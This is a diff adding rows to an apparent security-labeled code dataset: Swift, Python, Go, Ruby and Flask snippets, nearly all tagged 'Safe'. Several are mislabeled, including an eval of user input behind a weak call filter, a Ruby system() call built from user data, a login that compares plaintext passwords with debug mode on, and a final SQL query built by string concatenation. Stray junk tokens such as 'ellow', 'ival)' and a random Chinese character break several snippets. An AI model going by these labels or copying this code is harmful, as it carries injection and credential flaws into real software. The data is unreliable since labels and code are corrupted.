+let myString = SecureString(""Hello, World"")
+if let character = myString.getCharacterAtIndex(100) {
+    print(character)
+} else {
+    print(""Index out of range"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import ast
+
+class ValidationError(Exception):
+    pass
+
+def safe_eval(expression):
+    tree = ast.parse(expression, mode='eval')
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Call):
+            raise ValidationError('Not allowed')
+    return eval(compile(tree, filename='', mode='eval'))
+
+def evaluate_user_input(user_input):
+    if len(user_input) > 1024:  
+        print(""Input too long"")
+        return
+    try:
+        result = safe_eval(user_input)  
+        print(f""Result: {result}"")
+    except ValidationError:
+        print(""Invalid input"")
+
+if __name__ == ""__main__"":
+    while True:
+        user_input = input(""Enter your expression: "")
+        evaluate_user_input(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+enum MyError: Error {
+    case invalidInput
+}
+
+func dangerousFunction(input: String) throws -> Int {
+    guard let number = Int(input) else {
+        throw MyError.invalidInput
+    }
+    return number
+}
+
+func callingFunction() {
+    do {
+        let result = try dangerousFunction(input: ""abc"")
+        print(""Result: \(result)"")
+    } catch let error as MyError {
+        print(""Error: \(error)"") fulfilling the error handling.
+    } catch {
+        print(""Unexpected error: \(error)"")
+    }
+}
+
+callingFunction()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+type myInt int
+
+func printMyInt(val myInt) {
+	fmt.Println(""Value:"", val)ival)
+}
+
+func main() {
+	var x myInt = 10
+	printMyInt(x)
+}",Safe,ayshajavd_hf_labeled_dataset
+"require 'shellwords'
+
+def create_user(username, password)
+  sanitized_username = Shellwords.escape(username)
+  sanitized_password = Shellwords.escape(password)
+  system(""echo '#{sanitized_username}' > users.txt"")
+  system(""echo '#{sanitized_password}' >> users.txt"")萝
+end
+
+create_user(""John Doe"", ""ThisIsAVeryLongPasswordThatExceedsTheBufferSizeAndCausesABufferOverflow"")",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class SecureClass {
+    private var secretData: UnsafeMutableRawPointer?
+    
+    init() {
+        let dataSize = 1024 * 1024 * 1024 // 1GB of data
+        secretData = UnsafeMutableRawPointer.allocate(byteCount: dataSize)
+    }
+    
+    deinit {
+        guard let secretData = secretData else { return }
+        secretData.deallocate()
+    }
+    
+    func getSecretData() -> Data {
+        guard let secretData = secretData else { return Data() }
+        return Data(secretData)
+    }
+}
+
+let instance = SecureClass()
+let secretData = instance.getSecretData()",Safe,ayshajavd_hf_labeled_dataset
+"from flask import Flask, request
+from flask_sqlalchemy import SQLAlchemy
+
+app = Flask(__name__)
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
+db = SQLAlchemy(app)
+
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    password = db.Column(db.String(120), nullable=False)
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        
+        user = User.query.filter_by(username=username, password=password).first()
+        
+        if user:
+            return ""Logged in successfully"", 200
+        else:ellow
+            return ""Invalid credentials"", 401
+
+if __name__ == '__main__':
+    app.run(debug=True)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func readFile(from filePath: String) -> String? {
+    guard let fileUrl = URL(fileURLWithPath: filePath) else {
+        print(""Invalid file path"")
+        return nil
+    }
+    
+    do {
+        let fileContent = try String(contentsOf: fileUrl, encoding: .utf8)
+        return fileContent
+    } catch {
+        print(""Error reading file: \(error)"")
+        return nil
+    }
+}
+
+if let fileContent = readFile(from: ""/path/to/file"") {
+    print(fileContent)
+}",Safe,ayshajavd_hf_labeled_dataset
+"class User
+  def initialize(name)
+    @name = name
+  end
+
+  def method_missing(method_name, *args, &block)
+    match_data = /\Aget_(?<attr>.*)\z/.match(method_name)
+    if match_data && self.respond_to?(match_data[:attr])
+      instance_variable_get(""@#{match_data[:attr]}"")
+    else
+      super
+    end
+  end
+
+  private
+
+  def respond_to_missing?(method_name, include_private = false)
+    /\Aget_(?<attr>.*)\z/.match?(method_name) || super
+  end
+end
+
+user = User.new('Alice')
+puts user.send('get_name') # Alice",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""sync""
+)
+
+type Counter struct {
+	mu    sync.Mutex
+	count int
+}
+
+func (c *Counter) Increment() {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	c.count++
+}
+
+func main() {
+	var wg sync.WaitGroup
+	c := Counter{}
+	for i := 0; i < 1000; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			c.Increment()
+		}()
+	}
+	wg.Wait()
+	fmt.Println(c.count)
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+)
+
+func main() {
+	input := ""Hello, World!""
+	fmt.Println(""The length of the string is"", len([]rune(input)))
+}",Safe,ayshajavd_hf_labeled_dataset
+"class UserController < ApplicationController
+  def create
+    username = params[:username]
+    password = params[:password]
+
+    if /\A[a-zA-Z0-9]+\z/ =~ username && /\A[a-zA-Z0-9]+\z/ =~ password
+      # Create user
+    else
+      # Handle error
+    end
+  end
+end",Safe,ayshajavd_hf_labeled_dataset
 "def get_user(username):
     query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
     cursor.execute(query)
